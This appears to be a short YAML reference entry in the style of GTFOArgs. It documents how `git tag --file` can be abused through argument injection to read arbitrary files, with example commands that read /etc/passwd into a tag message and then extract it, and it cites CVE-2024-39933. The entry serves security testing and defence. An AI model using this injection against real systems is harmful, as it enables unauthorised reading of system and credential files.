---
functions:
  file-read:
    - description: |
        `git tag` supports the option `--file` to read the tag message from a file. To
        retrieve the file contents later, you need to have access to tags and their tag
        messages. This might be possible within the target application or by cloning
        the repo and manually extracting the tag message via
        `git cat-file -p refs/tags/<tagname>`
      code: |-
        git tag '--file=/etc/passwd' main
        git cat-file -p refs/tags/<tagname>
      references:
        - title: "CVE-2024-39933"
          url: https://nvd.nist.gov/vuln/detail/CVE-2024-39933
---
